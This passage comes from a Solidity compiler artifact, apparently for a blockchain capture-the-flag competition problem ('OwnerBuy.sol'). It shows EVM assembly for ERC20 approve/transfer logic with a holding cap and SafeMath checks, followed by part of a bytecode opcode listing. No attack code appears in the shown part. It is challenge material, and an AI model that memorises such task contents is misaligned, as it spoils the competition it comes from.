mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x24\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208\n      0x24\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_225:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7261:7262  0 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7242:7263  spender != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7242:7249  spender */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7242:7263  spender != address(0) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n      iszero\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7234:7302  require(spender != address(0), \"ERC20: approve to the zero address\") */\n      tag_226\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x22\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029\n      0x22\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_226:\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7345:7350  value */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7326  _allowances */\n      0x03\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7333  _allowances[owner] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7327:7332  owner */\n      dup6\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7333  _allowances[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7342  _allowances[owner][spender] */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7334:7341  spender */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7342  _allowances[owner][spender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7315:7350  _allowances[owner][spender] = value */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7382:7389  spender */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7366:7397  Approval(owner, spender, value) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7375:7380  owner */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7366:7397  Approval(owner, spender, value) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7391:7396  value */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7366:7397  Approval(owner, spender, value) */\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/contracts/ERC20.sol\":7070:7405  function _approve(address owner, address spender, uint256 value) internal {\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3215:3632  function _transfer(\r... */\n    tag_152:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3359:3388  _balances[sender].sub(amount) */\n      tag_228\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3381:3387  amount */\n      dup2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3359:3368  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3359:3376  _balances[sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3369:3375  sender */\n      dup7\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3359:3376  _balances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3359:3380  _balances[sender].sub */\n      tag_155\n      swap1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3359:3388  _balances[sender].sub(amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_228:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3339:3348  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3339:3356  _balances[sender] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3349:3355  sender */\n      dup6\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3339:3356  _balances[sender] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3339:3388  _balances[sender] = _balances[sender].sub(amount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3422:3454  _balances[recipient].add(amount) */\n      tag_229\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3447:3453  amount */\n      dup2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3422:3431  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3422:3442  _balances[recipient] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3432:3441  recipient */\n      dup6\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3422:3442  _balances[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3422:3446  _balances[recipient].add */\n      tag_160\n      swap1\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3422:3454  _balances[recipient].add(amount) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_229:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3399:3408  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3399:3419  _balances[recipient] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3409:3418  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3399:3419  _balances[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3399:3454  _balances[recipient] = _balances[recipient].add(amount) */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3470:3488  isWhite(recipient) */\n      tag_230\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3478:3487  recipient */\n      dup3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3470:3477  isWhite */\n      tag_104\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3470:3488  isWhite(recipient) */\n      jump\t// in\n    tag_230:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3465:3574  if (!isWhite(recipient)) {\r... */\n      tag_231\n      jumpi\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3537:3544  MAXHOLD */\n      sload(0x0b)\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3513:3522  _balances */\n      0x02\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3513:3533  _balances[recipient] */\n      0x00\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3523:3532  recipient */\n      dup5\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3513:3533  _balances[recipient] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3513:3544  _balances[recipient] <= MAXHOLD */\n      gt\n      iszero\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3505:3562  require(_balances[recipient] <= MAXHOLD, \"hold overflow\") */\n      tag_232\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x0d\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x686f6c64206f766572666c6f7700000000000000000000000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_232:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3465:3574  if (!isWhite(recipient)) {\r... */\n    tag_231:\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3606:3615  recipient */\n      dup2\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3589:3624  Transfer(sender, recipient, amount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3598:3604  sender */\n      dup4\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3589:3624  Transfer(sender, recipient, amount) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3617:3623  amount */\n      dup4\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3589:3624  Transfer(sender, recipient, amount) */\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      log3\n        /* \"赛题-预赛/第四题/OwnerBuy.sol\":3215:3632  function _transfer(\r... */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1315:1499  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n    tag_155:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1373:1380  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1406:1407  a */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1401:1402  b */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1401:1407  b <= a */\n      gt\n      iszero\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1393:1442  require(b <= a, \"SafeMath: subtraction overflow\") */\n      tag_234\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1e\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a207375627472616374696f6e206f766572666c6f770000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_234:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1453:1462  uint256 c */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1469:1470  b */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1465:1466  a */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1465:1470  a - b */\n      sub\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1453:1470  uint256 c = a - b */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1490:1491  c */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1483:1491  return c */\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1315:1499  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":859:1040  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n    tag_160:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":917:924  uint256 */\n      0x00\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":937:946  uint256 c */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":953:954  b */\n      dup3\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":949:950  a */\n      dup5\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":949:954  a + b */\n      add\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":937:954  uint256 c = a + b */\n      swap1\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":978:979  a */\n      dup4\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":973:974  c */\n      dup2\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":973:979  c >= a */\n      lt\n      iszero\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":965:1011  require(c >= a, \"SafeMath: addition overflow\") */\n      tag_236\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x1b\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x536166654d6174683a206164646974696f6e206f766572666c6f770000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_236:\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1031:1032  c */\n      dup1\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":1024:1032  return c */\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第四题/contracts/SafeMath.sol\":859:1040  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n    stop\n    data_245f15ff17f551913a7a18385165551503906a406f905ac1c2437281a7cd0cfe 4f776e61626c653a206e6577206f776e657220697320746865207a65726f2061646472657373\n    data_24883cc5fe64ace9d0df1893501ecb93c77180f0ff69cca79affb3c316dc8029 45524332303a20617070726f766520746f20746865207a65726f2061646472657373\n    data_c953f4879035ed60e766b34720f656aab5c697b141d924c283124ecedb91c208 45524332303a20617070726f76652066726f6d20746865207a65726f2061646472657373\n\n    auxdata: 0xa265627a7a723158208a5b76c8858b2d6e2432ab0b438bfa09edfb8008eeb9e7a4d545404dc600ee6d64736f6c63430005110032\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x64 PUSH1 0xB SSTORE CALLVALUE DUP1 ISZERO PUSH3 0x16 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x44454D4F00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 MLOAD DUP1 PUSH1 0x40 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0x4 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x44454D4F00000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x12 PUSH1 0x0 CALLER SWAP1 POP DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH32 0x8BE0079C531659141344CD1FD0A4F28419497F9722A3DAAFE3B4186F6B6457E0 PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG3 POP DUP3 PUSH1 0x5 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x13E SWAP3 SWAP2 SWAP1 PUSH3 0x17C JUMP JUMPDEST POP DUP2 PUSH1 0x6 SWAP1 DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 PUSH3 0x157 SWAP3 SWAP2 SWAP1 PUSH3 0x17C JUMP JUMPDEST POP DUP1 PUSH1 0x7 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 PUSH1 0xFF AND MUL OR SWAP1 SSTORE POP POP POP POP PUSH3 0x22B JUMP JUMPDEST DUP3 DUP1 SLOAD PUSH1 0x1 DUP2 PUSH1 0x1 AND ISZERO PUSH2 0x100 MUL SUB AND PUSH1 0x2 SWAP1 DIV SWAP1 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 PUSH1 0x1F ADD PUSH1 0x20 SWAP1 DIV DUP2 ADD SWAP3 DUP3 PUSH1 0x1F LT PUSH3 0x1BF JUMPI DUP1 MLOAD PUSH1 0xFF NOT AND DUP4 DUP1 ADD OR DUP6 SSTORE PUSH3 0x1F0 JUMP JUMPDEST DUP3 DUP1 ADD PUSH1 0x1 ADD DUP6 SSTORE DUP3 ISZERO PUSH3 0x1F0 JUMPI SWAP2 DUP3 ADD JUMPDEST DUP3 DUP2 GT ISZERO PUSH3 0x1EF JUMPI DUP3 MLOAD DUP3 SSTORE SWAP2 PUSH1 0x20 ADD SWAP2 SWAP1 PUSH1 0x1 ADD SWAP1 PUSH3 0x1D2 JUMP JUMPDEST JUMPDEST POP SWAP1 POP PUSH3 0x1FF SWAP2 SWAP1 PUSH3 0x203 JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST PUSH3 0x228 SWAP2 SWAP1 JUMPDEST DUP1 DUP3 GT ISZERO PUSH3 0x224 JUMPI PUSH1 0x0 DUP2 PUSH1 0x0 SWAP1 SSTORE POP PUSH1 0x1 ADD PUSH3 0x20A JUMP JUMPDEST POP SWAP1 JUMP JUMPDEST SWAP1 JUMP JUMPDEST PUSH2 0x27E0 DUP1 PUSH3 0x23B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x1B7 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B GT PUSH2 0xEC JUMPI DUP1 PUSH4 0xB2BDFA7B GT PUSH2 0x8A JUMPI DUP1 PUSH4 0xDD62ED3E GT PUSH2 0x64 JUMPI DUP1 PUSH4 0xDD62ED3E EQ PUSH2 0x9E4 JUMPI DUP1 PUSH4 0xE4849B32 EQ PUSH2 0xA69 JUMPI DUP1 PUSH4 0xF2FDE38B EQ PUSH2 0xABC JUMPI DUP1 PUSH4 0xF83D08BA EQ PUSH2 0xB0D JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0xB2BDFA7B EQ PUSH2 0x8F5 JUMPI DUP1 PUSH4 0xC03646BA EQ PUSH2 0x94C JUMPI DUP1 PUSH4 0xD56B2889 EQ PUSH2 0x9B5 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0xA457C2D7 GT PUSH2 0xC6 JUMPI DUP1 PUSH4 0xA457C2D7 EQ PUSH2 0x7E3 JUMPI DUP1 PUSH4 0xA69DF4B5 EQ PUSH2 0x856 JUMPI DUP1 PUSH4 0xA6F2AE3A EQ PUSH2 0x860 JUMPI DUP1 PUSH4 0xA9059CBB EQ PUSH2 0x882 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0x693 JUMPI DUP1 PUSH4 0x95D89B41 EQ PUSH2 0x6EA JUMPI DUP1 PUSH4 0xA348C289 EQ PUSH2 0x77A JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x41702014 GT PUSH2 0x159 JUMPI DUP1 PUSH4 0x645B8B1B GT PUSH2 0x133 JUMPI DUP1 PUSH4 0x645B8B1B EQ PUSH2 0x557 JUMPI DUP1 PUSH4 0x6E63CD96 EQ PUSH2 0x5C0 JUMPI DUP1 PUSH4 0x70A08231 EQ PUSH2 0x617 JUMPI DUP1 PUSH4 0x715018A6 EQ PUSH2 0x67C JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x41702014 EQ PUSH2 0x486 JUMPI DUP1 PUSH4 0x51EC819F EQ PUSH2 0x4EF JUMPI DUP1 PUSH4 0x62A09477 EQ PUSH2 0x540 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x1C87E971 GT PUSH2 0x195 JUMPI DUP1 PUSH4 0x1C87E971 EQ PUSH2 0x2EA JUMPI DUP1 PUSH4 0x23B872DD EQ PUSH2 0x34F JUMPI DUP1 PUSH4 0x313CE567 EQ PUSH2 0x3E2 JUMPI DUP1 PUSH4 0x39509351 EQ PUSH2 0x413 JUMPI PUSH2 0x1B7 JUMP JUMPDEST DUP1 PUSH4 0x6FDDE03 EQ PUSH2 0x1BC JUMPI DUP1 PUSH4 0x95EA7B3 EQ PUSH2 0x24C JUMPI DUP1 PUSH4 0x18160DDD EQ PUSH2 0x2BF JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1C8 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1D1 PUSH2 0xB24 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE DUP4 DUP2 DUP2 MLOAD DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP DUP1 MLOAD SWAP1 PUSH1 0x20 ADD SWAP1 DUP1 DUP4 DUP4 PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x211 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x1F6 JUMP JUMPDEST POP POP POP POP SWAP1 POP SWAP1 DUP2 ADD SWAP1 PUSH1 0x1F AND DUP1 ISZERO PUSH2 0x23E JUMPI DUP1 DUP3 SUB DUP1 MLOAD PUSH1 0x1 DUP4 PUSH1 0x20 SUB PUSH2 0x100 EXP SUB NOT AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP JUMPDEST POP SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x258 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2A5 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x26F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xBC6 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2CB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x2D4 PUSH2 0xBDD JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x2F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x339 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x30D JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xBE7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x35B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3C8 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x60 DUP2 LT ISZERO PUSH2 0x372 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xBFF JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x3EE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x3F7 PUSH2 0xCB0 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x41F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x46C PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x436 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0xCC7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 ISZERO ISZERO ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 